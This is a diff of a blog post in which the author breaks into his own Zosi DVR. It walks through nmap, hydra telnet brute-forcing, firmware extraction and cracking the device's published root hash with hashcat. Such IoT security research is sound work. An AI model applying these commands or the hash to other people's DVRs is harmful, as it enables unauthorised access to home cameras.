@@ -9,9 +9,9 @@ I never really felt like the owner of my Zosi H.264 DVR security system since I 
 
 **The Journey**
 
-My dad purchased a Zosi H.264 720p DVR camera system as a holiday gift some time ago.  He was gracious enough to come over and assist me with installing the cameras and fishing the power and data lines through the attic to my network rack.  It was a long dusty day of crawling through my home's attic but we were successful and I had a new security camera system to catch all the happenings around my home.
+My dad purchased a Zosi H.264 720p DVR camera system as a holiday gift for me some time ago.  He was gracious enough to come over and assist me with installing the cameras and fishing the power and data lines through the attic to my network rack.  It was a long dusty day of crawling through my home's attic but we were successful and I had a new security camera system to catch all the happenings around my home.
 
-The manufacturer offers a desktop and a mobile application to remotely view various cameras.  I wasn't too keen on accessing the video footage at any time so I opted not use the applications in favor of connecting a monitor to the DVR and viewing the closed feed whenever needed.  
+The manufacturer offers a desktop and a mobile application to remotely view various cameras.  I wasn't too keen on remotely accessing the video footage at any time so I opted not use the applications in favor of connecting a monitor to the DVR and viewing the closed feed whenever needed.  
 
 Out of curiosity I connected the DVR on my network and ran an `nmap` scan.  The scan quickly discovered port 23 telnet was open.  Telnet is an unencrypted remote access service which could grant me a terminal on the DVR if I had the credentials.
 
@@ -28,7 +28,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 3.66 seconds
 ```
 
-My enthusiasm was quickly displaced when I discovered that no credentials were provided with the documentation or otherwise published on the internet.  I was left wondering how I could still achieve remote connectivity and decided to try guessing the username and password.
+My enthusiasm was quickly displaced when I discovered that no credentials were provided with the documentation or otherwise published on the internet.  Naturally, I was inclined to find the credentials!
 
 Sending an ICMP `ping` to the DVR revealed a time to live (ttl) of 63 hops suggesting the DVR is running a Unix/Linux operating system.  Assuming so would probably have been a safe guess regardless, but with this information I would know that the root account would likely be a valid telnet user target.
 
@@ -42,7 +42,7 @@ PING 192.168.3.138 (192.168.3.138) 56(84) bytes of data.
 rtt min/avg/max/mdev = 1.235/1.235/1.235/0.000 ms
 ```
 
-Thinking that the password may be very simple, I attempted guessing a few commonly used passwords.  My guessed passwords where "blank", root, admin, zosi, and a handful of others before giving up and deciding to automate the effort using `hydra` network bruteforcing tool.
+Thinking that the password may be very simple, I attempted guessing a few commonly used passwords.  My guessed passwords were "blank", root, admin, zosi, and a handful of others before giving up and deciding to automate the effort using `hydra` network bruteforcing tool.
 
 ```bash
 daniel@daniel-desktop:~$ telnet 192.168.3.138
@@ -62,7 +62,7 @@ Login incorrect
 Connection closed by foreign host.
 ```
 
-`Hydra` is great for network authentication bruteforcing attacks but requires a password list.  Because network attacks can be somewhat slow I went for a shorter list `xato-net-10-million-passwords-100.txt` from Daniel Miessler's awesome SecLists repo.
+`Hydra` is great for network authentication bruteforcing attacks but requires a password list.  Because network attacks can be somewhat slow I went for a shorter list `xato-net-10-million-passwords-100.txt` from Daniel Miessler's awesome [SecLists repository](https://github.com/danielmiessler/SecLists).
 
 ```bash
 daniel@daniel-desktop:/$ hydra -l root -P /tmp/xato-net-10-million-passwords-100.txt 192.168.3.138 telnet
@@ -76,7 +76,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-17 19:11:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-17 19:11:31
 ```
 
-Zero hits, another bust!  I had another approach to try after having recently watched John Hammond's `Getting Started in Firmware Analysis & IoT Reverse Engineering` [YouTube Video](https://www.youtube.com/watch?v=zs86OYea8Wk) where he demonstrates sourcing and extracting an IoT's filesystem from firmware to grab encrypted passwords from the shadow file for cracking later.  This would be the next attack to try but I first needed to find the firmware that was running on the DVR.  To find the version of the firmware I used the DVR's User Guide on the Amazon page for the device. Section 9 of the user guide proudly display's instructions on how to upgrade the DVR and an example firmware version `rootfs-hi3520d`.
+Zero hits, another bust!  It was time for a firmware hacking approach.  John Hammond recently published a `Getting Started in Firmware Analysis & IoT Reverse Engineering` [YouTube Video](https://www.youtube.com/watch?v=zs86OYea8Wk) where he demonstrates sourcing and extracting an IoT's filesystem from firmware to grab encrypted passwords from the shadow file for cracking later.  Drawing inspiration for John's video, I first needed to find the firmware that was running on the DVR.  To find the version of the firmware I used the DVR's User Guide on the Amazon listing page for the device. Section 9 of the user guide proudly display's instructions on how to upgrade the DVR and an example firmware version `rootfs-hi3520d`.
 
 ![](files/Pasted%20image%2020230617194127.png)
 https://m.media-amazon.com/images/I/C1WFUEYWqzS.pdf
@@ -112,7 +112,7 @@ daniel@daniel-desktop:/tmp$ file system.jffs2
 system.jffs2: Linux jffs2 filesystem data little endian
 ```
 
-With the files ystem extracted I next set out to mount it in order to view the available system files.  After installing `jefferson` and its dependencies, I the tool on the system.jffs2 file which mounted all files into a jffs2-root directory in the current folder.
+With the files system extracted, I needed to view the system files by mounting the system.  I could achieve this using the [jefferson](https://github.com/sviehb/jefferson) tool.  After installing `jefferson` and its dependencies, I ran the tool on the system.jffs2 file which mounted all files into a jffs2-root directory in the current folder.
 
 Jefferson installation:
 ```bash
@@ -143,7 +143,7 @@ writing S_ISREG var/run/utmp
 ----------
 ```
 
-With the jffs2 file system mounted in jffs2-root directory, I  began exploring if this firmware has a shadow or passwd file that could contain the telnet user and encrypted password.  Running `ls` gave me an overview of the file system.
+Now that the jffs2 file system was mounted in jffs2-root directory, I  began exploring if this firmware had a shadow or passwd file that could contain the telnet user and encrypted password.  Running `ls` gave me an overview of the file system.
 
 ```bash
 daniel@daniel-desktop:/tmp/jffs2-root$ ls -la
@@ -174,32 +174,32 @@ drwxr-xr-x  6 root root  4096 Jun 17 20:32 usr
 drwxr-xr-x  3 root root  4096 Jun 17 20:32 var
 ```
 
-And listing files in the file system's etc folder reveals passwd file.  I used `cat` to dump the file contents which displayed the only user on the system root and their encrypted password `$1$Zvj.IvRb$7g3anRUwEV0tiP//JNqAh/`!
+And listing files in the file system's etc folder reveals passwd file.  I used `cat` to dump the file contents which displayed the only user on the system as root and the encrypted password `$1$Zvj.IvRb$7g3anRUwEV0tiP//JNqAh/`!  Usually a shadow file would contain the encrypted password, but I'm not complaining.
 
 ```bash
 daniel@daniel-desktop:/tmp/jffs2-root$ cat etc/passwd
 root:$1$Zvj.IvRb$7g3anRUwEV0tiP//JNqAh/:0:0::/root:/bin/sh
 ```
 
-I explored the rest of the file system for other secrets but it didn't turn up anything meaningful.  With the encrypted password in hand, I fired up my local cracking box which isn't anything more then physical consumer grade computer with an RTX 3060 graphics card.  Using `hashcat`, I started with a bruteforce attack of digits, uppercase, lowercase, and special characters.  
+I explored the rest of the file system for other secrets but it didn't turn up anything meaningful.  With the encrypted password in hand, I fired up my local cracking box which isn't anything more than a physical consumer grade computer with an RTX 3060 graphics card.  I started with a bruteforce attack using `hashcat` configured to try every combination of digits, uppercase, lowercase, and special characters.  
 
 ```bash
 hashcat -a 3 -m 500 -O -w 3 -1?l?u?d?s ?1?1?1 zosi.passwd
 ```
 
-After a full day of cracking, the system reached 7 character attempts which were estimated to take 30 days so I re-calibrated `hashcat` to bruteforce only common special characters which required 3 full days of running.  
+After a full day of running, `hashcat` incremented to 7 character attempts that were estimated to take 30 days of runtime.  Because 30 days was too long, I re-calibrated the tool to bruteforce only common special characters.  This new calibration of 7 characters with a limited special character set would consume 3 full days of running.  
 
 ```bash
 hashcat -m 500 zosi.passwd -a 3 -1 '!@#$%/.' -2?u?l?d ?2?2?2?2?2?2?2?2?2?2 -i -w 3 -O --increment-min=7
 ```
 
-After 3 long days of  password cracking 7 characters, all combinations were exhausted and 8 characters were going to take another 30 days.  30 days definitely exceeded my interest in this project so I decided to turn to a `hashcat` wordlist approach using rockyou.txt with the dive ruleset.  The rockyou file contains about 14 million passwords from a data breach back in 2009.  14 million passwords might sound like a lot but it is grossly insufficient and only takes a few minutes to try every password in the list.  But you can extend that list by using hashcat's dive rule which mutates each password in the list with hundreds of rules like adding a couple digits to the end of the password or changing the letter s to a dollar sign.  Rockyou with the dive rule brings the total attempts from 14 million to about 1.5 trillion attempts over the coming day.  I fired it off and went to bed.  
+After 3 long days of  password cracking 7 characters, all combinations were exhausted and 8 characters were going to take another 30 days.  30 days definitely exceeded my interest in this project so I decided to turn to a `hashcat` wordlist approach using rockyou.txt with the dive ruleset.  The rockyou file contains about 14 million passwords from a data breach back in 2009.  14 million passwords might sound like a lot but it is grossly insufficient and only takes a few minutes to try every password in the list.  But you can extend that list by using hashcat's dive ruleset which mutates each password in the list with hundreds of rules like adding a couple digits to the end of the password or changing the letter "s" to a dollar sign.  Rockyou with the dive rule brings the total attempts from 14 million to about 1.5 trillion and would demand a full day of runtime to complete.  I fired it off and went to bed.  
 
 ```bash
 hashcat -m 500 zosi.passwd wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule -w 3 -O
 ```
 
-The next morning I checked the status of the crack and bingo, password cracked!!
+The next morning I checked the status of the rockyou+dive ruleset and bingo, password cracked!!
 
 ```bash
 
